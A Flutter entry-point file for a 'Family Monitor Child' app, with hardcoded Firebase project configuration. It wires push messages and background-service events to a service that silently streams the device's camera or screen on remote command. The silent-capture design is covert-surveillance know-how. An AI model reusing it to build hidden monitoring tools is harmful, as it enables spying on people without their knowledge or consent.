import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'screens/child/child_auth_screen.dart';
import 'screens/child/child_home_screen.dart';
import 'screens/child/child_qr_screen.dart';
import 'screens/child/child_setup_wizard_screen.dart';
import 'services/background_monitoring_service.dart';
import 'services/silent_webrtc_service.dart';
import 'services/foreground_service.dart';
import 'services/auth_service.dart';
import 'services/webrtc_service.dart';

final GlobalKey<NavigatorState> childNavKey = GlobalKey<NavigatorState>();

@pragma('vm:entry-point')
Future<void> _firebaseMessagingBackgroundHandler(RemoteMessage message) async {
  if (Firebase.apps.isEmpty) {
    await Firebase.initializeApp(options: const FirebaseOptions(
      apiKey: 'AIzaSyAbX2gNNW3iZCIgn2UJjtbZdtQHM3CyjW4',
      authDomain: 'family-monitor-7aab3.firebaseapp.com',
      databaseURL: 'https://family-monitor-7aab3-default-rtdb.firebaseio.com',
      projectId: 'family-monitor-7aab3',
      storageBucket: 'family-monitor-7aab3.firebasestorage.app',
      messagingSenderId: '758644747673',
      appId: '1:758644747673:android:69ef23a2fa4b508122f708',
    ));
  }
  if (message.data['type'] == 'call') {
    final svc = FlutterBackgroundService();
    if (!await svc.isRunning()) await svc.startService();
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  FlutterError.onError = (details) {
    FlutterError.presentError(details);
    debugPrint('=== FLUTTER CRASH: ${details.exception} ===');
    debugPrint(details.stack.toString());
  };

  PlatformDispatcher.instance.onError = (error, stack) {
    debugPrint('=== DART CRASH: $error ===');
    debugPrint(stack.toString());
    return true;
  };

  await SystemChrome.setPreferredOrientations(
      [DeviceOrientation.portraitUp, DeviceOrientation.portraitDown]);

  await Firebase.initializeApp(options: const FirebaseOptions(
    apiKey: 'AIzaSyAbX2gNNW3iZCIgn2UJjtbZdtQHM3CyjW4',
    authDomain: 'family-monitor-7aab3.firebaseapp.com',
    databaseURL: 'https://family-monitor-7aab3-default-rtdb.firebaseio.com',
    projectId: 'family-monitor-7aab3',
    storageBucket: 'family-monitor-7aab3.firebasestorage.app',
    messagingSenderId: '758644747673',
    appId: '1:758644747673:android:69ef23a2fa4b508122f708',
  ));

  FirebaseMessaging.onBackgroundMessage(_firebaseMessagingBackgroundHandler);
  await BackgroundMonitoringService.initialize();
  MonitoringForegroundService.initForegroundTask();

  // Auto-start background service if setup is done
  final wizardDone = await BackgroundMonitoringService.isWizardDone();
  if (wizardDone) {
    await BackgroundMonitoringService.startService();
  }

  runApp(const ChildApp());
}

class ChildApp extends StatefulWidget {
  const ChildApp({super.key});
  @override
  State<ChildApp> createState() => _ChildAppState();
}

class _ChildAppState extends State<ChildApp> {
  @override
  void initState() {
    super.initState();
    // IPC from background service isolate → main isolate
    FlutterBackgroundService().on('silent_stream').listen((data) {
      if (data == null) return;
      final uid  = data['uid']  as String?;
      final mode = data['mode'] as String? ?? 'camera';
      if (uid == null) return;
      if (mode == 'screen') {
        SilentWebRTCService.instance.startSilentScreen(uid).catchError((_) {});
      } else {
        SilentWebRTCService.instance.startSilentCamera(uid).catchError((_) {});
      }
    });
    FlutterBackgroundService().on('silent_stop').listen((_) {
      SilentWebRTCService.instance.stopSilent();
    });
  }

  Future<Widget> _getStartScreen() async {
    final auth = AuthService();
    if (!auth.isLoggedIn) return const ChildAuthScreen();
    final uid = auth.currentUser!.uid;
    final wizardDone = await BackgroundMonitoringService.isWizardDone();
    if (!wizardDone) return ChildSetupWizardScreen(childUid: uid);
    return const ChildHomeScreen();
  }

  @override
  Widget build(BuildContext context) {
    return WithForegroundTask(
      child: MaterialApp(
        title: 'Family Monitor Child',
        debugShowCheckedModeBanner: false,
        navigatorKey: childNavKey,
        theme: ThemeData(
          useMaterial3: true,
          colorScheme: ColorScheme.fromSeed(seedColor: const Color(0xFF34A853)),
        ),
        home: FutureBuilder<Widget>(
          future: _getStartScreen(),
          builder: (context, snapshot) {
            if (snapshot.hasError) {
              return Scaffold(
                backgroundColor: Colors.red,
                body: SafeArea(
                  child: SingleChildScrollView(
                    padding: const EdgeInsets.all(16),
                    child: Text(
                      'ERROR:\n${snapshot.error}\n\nSTACK:\n${snapshot.stackTrace}',
                      style: const TextStyle(color: Colors.white, fontSize: 12),
                    ),
                  ),
                ),
              );
            }
            if (!snapshot.hasData) {
              return const Scaffold(
                backgroundColor: Color(0xFF34A853),
                body: Center(child: CircularProgressIndicator(color: Colors.white)),
              );
            }
            return snapshot.data!;
          },
        ),
        routes: {
          '/child/home': (_) => const ChildHomeScreen(),
          '/child/qr':   (_) => ChildQrScreen(uid: '', childName: ''),
        },
      ),
    );
  }
}
